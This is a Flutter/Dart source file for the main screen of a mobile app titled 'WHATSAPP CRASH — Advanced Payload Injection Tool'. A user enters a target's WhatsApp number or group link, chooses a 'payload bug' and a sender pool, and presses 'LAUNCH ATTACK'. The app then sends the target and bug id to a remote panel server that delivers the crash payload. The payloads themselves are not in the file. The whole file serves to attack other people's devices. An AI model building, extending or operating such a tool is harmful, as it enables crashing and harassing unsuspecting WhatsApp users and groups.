import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  late AnimationController _fadeController;
  late AnimationController _pulseController;
  String selectedBugId = "";

  String _selectedBugMode = "number";

  bool _isSending = false;
  String? _responseMessage;
  String _selectedSender = "private";
  
  // New variables for sender selection dialog
  String? _pendingTarget;
  String? _pendingBugId;

  // Sender stats
  int _privateSenderCount = 0;
  int _globalSenderCount = 0;
  Timer? _statsTimer;
  
  // Video player
  late VideoPlayerController _videoController;
  bool _isVideoInitialized = false;

  // ─── RED/DARK THEME (SAMA DENGAN DASHBOARD) ───────────────────────────────
  final Color bgDark = const Color(0xFF000000);      // Deep dark background
  final Color primaryRed = const Color(0xFFB71C1C);  // Dark red primary
  final Color accentRed = const Color(0xFFFF1744);   // Bright red accent
  final Color lightRed = const Color(0xFFFF5252);    // Light red
  final Color primaryWhite = Colors.white;
  final Color accentGrey = Colors.grey.shade400;
  final Color cardGlass = const Color(0xFF111111);   // Dark red card
  final Color borderGlass = const Color(0xFF3A1A1A); // Subtle red border

  @override
  void initState() {
    super.initState();

    _fadeController = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);

    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);

    if (widget.listBug.isNotEmpty) {
      final numberBugs = widget.listBug.where((b) => b['bug_name'] != null).toList();
      selectedBugId = numberBugs.isNotEmpty ? numberBugs[0]['bug_id'] : widget.listBug[0]['bug_id'];
    }

    // Initialize video player
    _videoController = VideoPlayerController.asset('assets/videos/banner.mp4')
      ..initialize().then((_) {
        setState(() {
          _isVideoInitialized = true;
        });
        _videoController.setLooping(true);
        _videoController.play();
      });

    _fetchSenderStats();
    _statsTimer = Timer.periodic(const Duration(seconds: 30), (timer) {
      _fetchSenderStats();
    });
  }

  @override
  void dispose() {
    _fadeController.dispose();
    _pulseController.dispose();
    targetController.dispose();
    _statsTimer?.cancel();
    _videoController.dispose();
    super.dispose();
  }

  Future<void> _fetchSenderStats() async {
    try {
      final response = await http.get(
        Uri.parse("http://bandar-panel.astralmarket.my.id:2415/getSenderStats?key=${widget.sessionKey}")
      );
      
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['valid'] == true) {
          setState(() {
            _privateSenderCount = data['private'] ?? 0;
            _globalSenderCount = data['global'] ?? 0;
          });
        }
      }
    } catch (e) {
      print("Error fetching sender stats: $e");
    }
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (!cleaned.startsWith('+') || cleaned.length < 8) return null;
    return cleaned;
  }

  bool isValidGroupLink(String input) =>
      input.contains('chat.whatsapp.com') && input.contains('https://');

  Future<void> _prepareAndShowSenderDialog() async {
    final rawInput = targetController.text.trim();
    final key = widget.sessionKey;

    if (_selectedBugMode == "number") {
      final target = formatPhoneNumber(rawInput);
      if (target == null || key.isEmpty) {
        _showAlert(
            "❌ Invalid Number",
            "Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.");
        return;
      }
    } else {
      if (!isValidGroupLink(rawInput)) {
        _showAlert(
            "❌ Invalid Link",
            "Masukkan link group WA yang valid (contoh: https://chat.whatsapp.com/...).");
        return;
      }
    }

    // Store pending data and show sender selection dialog
    setState(() {
      _pendingTarget = rawInput;
      _pendingBugId = selectedBugId;
    });
    
    _showSenderSelectionDialog();
  }

  void _showSenderSelectionDialog() {
    showDialog(
      context: context,
      barrierDismissible: true,
      barrierColor: Colors.black.withOpacity(0.7), // Overlay hitam
      builder: (BuildContext context) {
        return Dialog(
          backgroundColor: Colors.transparent,
          insetPadding: const EdgeInsets.symmetric(horizontal: 20),
          child: Container(
            decoration: BoxDecoration(
              color: cardGlass,
              borderRadius: BorderRadius.circular(24),
              border: Border.all(color: accentRed.withOpacity(0.5), width: 1.5),
              boxShadow: [
                BoxShadow(
                  color: primaryRed.withOpacity(0.4),
                  blurRadius: 30,
                  spreadRadius: 2,
                ),
              ],
            ),
            child: Padding(
              padding: const EdgeInsets.all(24),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  // Header
                  Container(
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      color: primaryRed.withOpacity(0.2),
                      borderRadius: BorderRadius.circular(16),
                    ),
                    child: const Icon(
                      Icons.send_rounded,
                      color: Color(0xFFFF1744),
                      size: 40,
                    ),
                  ),
                  const SizedBox(height: 20),
                  Text(
                    "PILIH SENDER",
                    style: TextStyle(
                      color: primaryWhite,
                      fontFamily: 'Orbitron',
                      fontWeight: FontWeight.bold,
                      fontSize: 18,
                      letterSpacing: 2,
                    ),
                  ),
                  const SizedBox(height: 8),
                  Text(
                    "Pilih sender untuk mengirim bug",
                    style: TextStyle(
                      color: accentGrey,
                      fontFamily: 'ShareTechMono',
                      fontSize: 12,
                    ),
                  ),
                  const SizedBox(height: 24),
                  
                  // Sender buttons
                  _buildDialogSenderButton("private", "SENDER PRIVATE"),
                  const SizedBox(height: 12),
                  _buildDialogSenderButton("global", "SENDER GLOBAL"),
                  
                  const SizedBox(height: 16),
                  
                  // Cancel button
                  TextButton(
                    onPressed: () {
                      setState(() {
                        _pendingTarget = null;
                        _pendingBugId = null;
                      });
                      Navigator.pop(context);
                    },
                    child: Text(
                      "BATAL",
                      style: TextStyle(
                        color: accentGrey,
                        fontFamily: 'Orbitron',
                        fontSize: 12,
                        letterSpacing: 1,
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ),
        );
      },
    );
  }

  Widget _buildDialogSenderButton(String sender, String label) {
    int activeCount = sender == "private" ? _privateSenderCount : _globalSenderCount;
    
    return GestureDetector(
      onTap: () {
        Navigator.pop(context); // Close dialog
        setState(() {
          _selectedSender = sender;
        });
        _sendBugWithPendingData(sender);
      },
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 18, horizontal: 20),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.centerLeft,
            end: Alignment.centerRight,
            colors: [
              const Color(0xFF2A0505),
              primaryRed.withOpacity(0.3),
            ],
          ),
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: accentRed.withOpacity(0.6), width: 1.5),
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.spaceBetween,
          children: [
            Row(
              children: [
                Container(
                  width: 10,
                  height: 10,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: accentRed,
                    boxShadow: [
                      BoxShadow(
                        color: accentRed.withOpacity(0.6),
                        blurRadius: 8,
                      ),
                    ],
                  ),
                ),
                const SizedBox(width: 12),
                Text(
                  label,
                  style: TextStyle(
                    color: primaryWhite,
                    fontWeight: FontWeight.bold,
                    fontSize: 14,
                    fontFamily: 'Orbitron',
                    letterSpacing: 1,
                  ),
                ),
              ],
            ),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
              decoration: BoxDecoration(
                color: accentRed.withOpacity(0.15),
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: accentRed.withOpacity(0.3)),
              ),
              child: Text(
                "$activeCount Active",
                style: TextStyle(
                  color: lightRed,
                  fontSize: 11,
                  fontFamily: 'ShareTechMono',
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Future<void> _sendBugWithPendingData(String sender) async {
    if (_pendingTarget == null || _pendingBugId == null) return;

    setState(() {
      _isSending = true;
      _responseMessage = null;
    });

    try {
      final res = await http.get(Uri.parse(
          "http://bandar-panel.astralmarket.my.id:2415/sendBug?key=${widget.sessionKey}&target=$_pendingTarget&bug=$_pendingBugId&sender=$sender"));
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        setState(() => _responseMessage = "⏳ Cooldown: Tunggu beberapa saat.");
      } else if (data["valid"] == false) {
        setState(() => _responseMessage = "❌ Key Invalid: Silakan login ulang.");
      } else if (data["sended"] == false) {
        setState(() => _responseMessage = "⚠️ Gagal: Server sedang maintenance.");
      } else {
        setState(() => _responseMessage = "✅ Berhasil mengirim bug!");
        targetController.clear();
      }
    } catch (_) {
      setState(() => _responseMessage = "❌ Error: Terjadi kesalahan. Coba lagi.");
    } finally {
      setState(() {
        _isSending = false;
        _pendingTarget = null;
        _pendingBugId = null;
      });
    }
  }

  Future<void> _sendBug() async {
    // This method is now deprecated, but kept for compatibility
    // The flow now goes through _prepareAndShowSenderDialog
    await _prepareAndShowSenderDialog();
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: cardGlass,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(18),
          side: BorderSide(color: accentRed.withOpacity(0.5)),
        ),
        title: Text(title,
            style: TextStyle(
              color: accentRed,
              fontFamily: 'Orbitron',
              fontWeight: FontWeight.bold,
            )),
        content: Text(msg,
            style: const TextStyle(
                color: Colors.grey, fontFamily: 'ShareTechMono')),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("OK",
                style: TextStyle(
                    color: accentRed, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  // ─── HEADER PANEL ────────────────────────────────────────────────────────
  Widget _buildHeaderPanel() {
    return AnimatedBuilder(
      animation: _fadeController,
      builder: (context, _) {
        return Container(
          padding: const EdgeInsets.symmetric(vertical: 26, horizontal: 24),
          decoration: BoxDecoration(
            color: cardGlass,
            borderRadius: BorderRadius.circular(16),
            border: Border.all(
              color: accentRed.withOpacity(0.20 + _fadeController.value * 0.15),
              width: 1.5,
            ),
            boxShadow: [
              BoxShadow(
                color: primaryRed.withOpacity(0.15),
                blurRadius: 24,
                spreadRadius: 2,
              ),
            ],
          ),
          child: Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              // Kiri: icon + judul + subtitle
              Row(
                children: [
                  // Icon pixel bug dalam lingkaran merah
                  Container(
                    width: 52,
                    height: 52,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      border: Border.all(
                        color: accentRed.withOpacity(0.6),
                        width: 1.5,
                      ),
                      color: primaryRed.withOpacity(0.15),
                    ),
                    child: Padding(
                      padding: const EdgeInsets.all(11),
                      child: CustomPaint(
                        painter: _PixelBugPainter(color: accentRed),
                      ),
                    ),
                  ),
                  const SizedBox(width: 16),
                  // Judul & subtitle
                  Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Text(
                        "WHATSAPP CRASH",
                        style: TextStyle(
                          color: accentRed,
                          fontFamily: 'Orbitron',
                          fontWeight: FontWeight.w900,
                          fontSize: 19,
                          letterSpacing: 2,
                        ),
                      ),
                      const SizedBox(height: 5),
                      Text(
                        "Advanced Payload Injection Tool",
                        style: TextStyle(
                          color: lightRed.withOpacity(0.65 + _fadeController.value * 0.35),
                          fontFamily: 'ShareTechMono',
                          fontSize: 12,
                          letterSpacing: 0.8,
                        ),
                      ),
                    ],
                  ),
                ],
              ),
              // Kanan: tombol role (ADMIN / OWNER / dll)
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 7),
                decoration: BoxDecoration(
                  color: Colors.transparent,
                  borderRadius: BorderRadius.circular(20),
                  border: Border.all(
                    color: accentRed.withOpacity(0.6),
                    width: 1.5,
                  ),
                ),
                child: Text(
                  widget.role.toUpperCase(),
                  style: TextStyle(
                    color: primaryWhite,
                    fontFamily: 'Orbitron',
                    fontWeight: FontWeight.bold,
                    fontSize: 11,
                    letterSpacing: 2,
                  ),
                ),
              ),
            ],
          ),
        );
      },
    );
  }

  // ─── VIDEO BANNER (tanpa border merah) ───────────────────────────────────
  Widget _buildVideoBanner() {
    if (!_isVideoInitialized) {
      return Container(
        height: 140,
        decoration: BoxDecoration(
          color: cardGlass,
          borderRadius: BorderRadius.circular(18),
        ),
        child: const Center(
          child: CircularProgressIndicator(
            color: Color(0xFFFF1744),
          ),
        ),
      );
    }
    
    return Container(
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(18),
        boxShadow: [
          BoxShadow(
            color: primaryRed.withOpacity(0.2),
            blurRadius: 20,
            spreadRadius: 1,
          ),
        ],
      ),
      clipBehavior: Clip.antiAlias,
      child: ClipRRect(
        borderRadius: BorderRadius.circular(18),
        child: SizedBox(
          height: 140,
          width: double.infinity,
          child: FittedBox(
            fit: BoxFit.cover,
            alignment: Alignment.center,
            child: SizedBox(
              width: _videoController.value.size.width,
              height: _videoController.value.size.height,
              child: VideoPlayer(_videoController),
            ),
          ),
        ),
      ),
    );
  }

  // ─── INPUT PANEL ─────────────────────────────────────────────────────────
  Widget _buildInputPanel() {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: cardGlass,
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: borderGlass, width: 1.5),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          Row(
            children: [
              Expanded(child: _buildBugModeButton("number", "BUG NOMOR")),
              const SizedBox(width: 14),
              Expanded(child: _buildBugModeButton("group", "BUG GROUP")),
            ],
          ),
          const SizedBox(height: 28),
          
          Text(
            _selectedBugMode == "number" ? "WHATSAPP NUMBER" : "WHATSAPP GROUP LINK",
            style: TextStyle(
              color: primaryWhite,
              fontWeight: FontWeight.w700,
              fontSize: 12,
              fontFamily: 'Orbitron',
              letterSpacing: 2,
            ),
          ),
          const SizedBox(height: 10),
          Container(
            decoration: BoxDecoration(
              color: bgDark,
              borderRadius: BorderRadius.circular(14),
              border: Border.all(color: borderGlass, width: 1.5),
            ),
            child: TextField(
              controller: targetController,
              style: TextStyle(
                  color: primaryWhite,
                  fontSize: 14,
                  fontFamily: 'ShareTechMono'),
              cursorColor: accentRed,
              keyboardType: _selectedBugMode == "number"
                  ? TextInputType.phone
                  : TextInputType.url,
              decoration: InputDecoration(
                hintText: _selectedBugMode == "number"
                    ? "e.g. +628xxxxxxxxxx"
                    : "e.g. https://chat.whatsapp.com/...",
                hintStyle: TextStyle(
                    color: accentGrey.withOpacity(0.55),
                    fontFamily: 'ShareTechMono'),
                filled: true,
                fillColor: Colors.transparent,
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(14),
                  borderSide: BorderSide.none,
                ),
                enabledBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(14),
                  borderSide: BorderSide.none,
                ),
                focusedBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(14),
                  borderSide: BorderSide(color: accentRed.withOpacity(0.5), width: 1.5),
                ),
                prefixIcon: Icon(
                  _selectedBugMode == "number"
                      ? Icons.phone_android_rounded
                      : Icons.group,
                  color: accentRed,
                ),
                contentPadding: const EdgeInsets.symmetric(vertical: 18, horizontal: 20),
              ),
            ),
          ),
          
          const SizedBox(height: 28),
          
          Text(
            "SELECT PAYLOAD BUG",
            style: TextStyle(
              color: primaryWhite,
              fontWeight: FontWeight.w700,
              fontSize: 12,
              fontFamily: 'Orbitron',
              letterSpacing: 2,
            ),
          ),
          const SizedBox(height: 10),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 18),
            decoration: BoxDecoration(
              color: bgDark,
              borderRadius: BorderRadius.circular(14),
              border: Border.all(color: borderGlass, width: 1.5),
            ),
            child: DropdownButtonHideUnderline(
              child: DropdownButton<String>(
                dropdownColor: cardGlass,
                value: selectedBugId.isNotEmpty ? selectedBugId : null,
                isExpanded: true,
                iconEnabledColor: accentRed,
                iconSize: 26,
                style: TextStyle(
                    color: primaryWhite,
                    fontSize: 14,
                    fontFamily: 'ShareTechMono'),
                items: widget.listBug.where((bug) {
                  if (_selectedBugMode == "group") {
                    return bug['bug_gb'] != null;
                  } else {
                    return bug['bug_name'] != null;
                  }
                }).map((bug) {
                  final displayName = _selectedBugMode == "group"
                      ? bug['bug_gb']
                      : bug['bug_name'];
                  return DropdownMenuItem<String>(
                    value: bug['bug_id'],
                    child: Row(
                      children: [
                        Container(
                          width: 18,
                          height: 18,
                          decoration: BoxDecoration(
                            shape: BoxShape.circle,
                            border: Border.all(color: accentRed.withOpacity(0.5), width: 1.5),
                            color: accentRed.withOpacity(0.08),
                          ),
                          child: Center(
                            child: Icon(Icons.close,
                                color: accentRed, size: 10),
                          ),
                        ),
                        const SizedBox(width: 10),
                        Text(
                          displayName,
                          style: TextStyle(
                              color: primaryWhite,
                              fontFamily: 'ShareTechMono',
                              fontSize: 14),
                        ),
                      ],
                    ),
                  );
                }).toList(),
                onChanged: (value) =>
                    setState(() => selectedBugId = value ?? ""),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildBugModeButton(String mode, String label) {
    final bool isSelected = _selectedBugMode == mode;
    return GestureDetector(
      onTap: () => setState(() {
        _selectedBugMode = mode;
        targetController.clear();
        final filtered = widget.listBug.where((bug) =>
            mode == "group" ? bug['bug_gb'] != null : bug['bug_name'] != null).toList();
        selectedBugId = filtered.isNotEmpty ? filtered[0]['bug_id'] : "";
      }),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 220),
        padding: const EdgeInsets.symmetric(vertical: 16),
        decoration: BoxDecoration(
          color: isSelected ? const Color(0xFF2A0505) : cardGlass,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(
            color: isSelected ? accentRed : borderGlass,
            width: isSelected ? 2 : 1.5,
          ),
          boxShadow: isSelected
              ? [
                  BoxShadow(
                    color: primaryRed.withOpacity(0.3),
                    blurRadius: 14,
                    spreadRadius: 1,
                  )
                ]
              : [],
        ),
        child: Center(
          child: Text(
            label,
            style: TextStyle(
              color: isSelected ? accentRed : accentGrey,
              fontWeight: FontWeight.bold,
              fontSize: 13,
              fontFamily: 'Orbitron',
              letterSpacing: 0.5,
            ),
          ),
        ),
      ),
    );
  }

  // ─── SEND BUTTON (tanpa sender selector) ─────────────────────────────────
  Widget _buildSendButton() {
    return AnimatedBuilder(
      animation: _pulseController,
      builder: (context, _) {
        return Container(
          height: 62,
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(14),
            gradient: const LinearGradient(
              begin: Alignment.centerLeft,
              end: Alignment.centerRight,
              colors: [
                Color(0xFFE53935),
                Color(0xFFC62828),
                Color(0xFFB71C1C),
              ],
            ),
            boxShadow: [
              BoxShadow(
                color: primaryRed.withOpacity(0.4 + _pulseController.value * 0.2),
                blurRadius: 15,
                spreadRadius: 1,
                offset: const Offset(0, 4),
              ),
            ],
          ),
          child: Material(
            color: Colors.transparent,
            child: InkWell(
              borderRadius: BorderRadius.circular(14),
              onTap: _isSending ? null : _prepareAndShowSenderDialog,
              child: Center(
                child: _isSending
                    ? SizedBox(
                        height: 24,
                        width: 24,
                        child: const CircularProgressIndicator(
                          color: Colors.white,
                          strokeWidth: 2.5,
                        ),
                      )
                    : Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(Icons.gps_fixed_rounded,
                              color: Colors.white, size: 22),
                          const SizedBox(width: 14),
                          Text(
                            "LAUNCH ATTACK",
                            style: TextStyle(
                              color: Colors.white,
                              fontWeight: FontWeight.w800,
                              fontSize: 16,
                              letterSpacing: 3.5,
                              fontFamily: 'Orbitron',
                            ),
                          ),
                        ],
                      ),
              ),
            ),
          ),
        );
      },
    );
  }

  Widget _buildResponseMessage() {
    if (_responseMessage == null) return const SizedBox.shrink();

    Color bgColor, borderColor, textColor;
    IconData icon;

    if (_responseMessage!.startsWith('✅')) {
      bgColor = Colors.green.withOpacity(0.1);
      borderColor = Colors.greenAccent;
      textColor = Colors.greenAccent;
      icon = Icons.check_circle_outline_rounded;
    } else if (_responseMessage!.startsWith('❌')) {
      bgColor = primaryRed.withOpacity(0.15);
      borderColor = accentRed;
      textColor = accentRed;
      icon = Icons.error_outline_rounded;
    } else {
      bgColor = primaryRed.withOpacity(0.07);
      borderColor = accentRed;
      textColor = lightRed;
      icon = Icons.info_outline_rounded;
    }

    return Padding(
      padding: const EdgeInsets.only(top: 20),
      child: Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: bgColor,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: borderColor.withOpacity(0.4), width: 1),
        ),
        child: Row(
          children: [
            Icon(icon, color: textColor, size: 22),
            const SizedBox(width: 12),
            Expanded(
              child: Text(
                _responseMessage!,
                style: TextStyle(
                  color: textColor,
                  fontWeight: FontWeight.bold,
                  fontSize: 13,
                  fontFamily: 'ShareTechMono',
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgDark,
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.symmetric(horizontal: 22, vertical: 24),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.center,
            children: [
              _buildHeaderPanel(),
              const SizedBox(height: 20),
              _buildVideoBanner(),
              const SizedBox(height: 24),
              _buildInputPanel(),
              const SizedBox(height: 36),
              _buildSendButton(),
              _buildResponseMessage(),
            ],
          ),
        ),
      ),
    );
  }
}

// ─── Pixel-art bug icon painter ────────────────────────────────────────────
class _PixelBugPainter extends CustomPainter {
  final Color color;
  const _PixelBugPainter({required this.color});

  static const List<List<int>> _grid = [
    [0, 0, 1, 1, 1, 1, 0, 0],
    [0, 1, 1, 1, 1, 1, 1, 0],
    [1, 1, 0, 1, 1, 0, 1, 1],
    [1, 1, 1, 1, 1, 1, 1, 1],
    [1, 1, 0, 1, 1, 0, 1, 1],
    [0, 1, 1, 1, 1, 1, 1, 0],
    [0, 0, 1, 0, 0, 1, 0, 0],
    [0, 0, 1, 0, 0, 1, 0, 0],
  ];

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()..color = color;
    final pw = size.width / 8;
    final ph = size.height / 8;

    for (int r = 0; r < 8; r++) {
      for (int c = 0; c < 8; c++) {
        if (_grid[r][c] == 1) {
          canvas.drawRect(
            Rect.fromLTWH(c * pw, r * ph, pw - 0.6, ph - 0.6),
            paint,
          );
        }
      }
    }
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}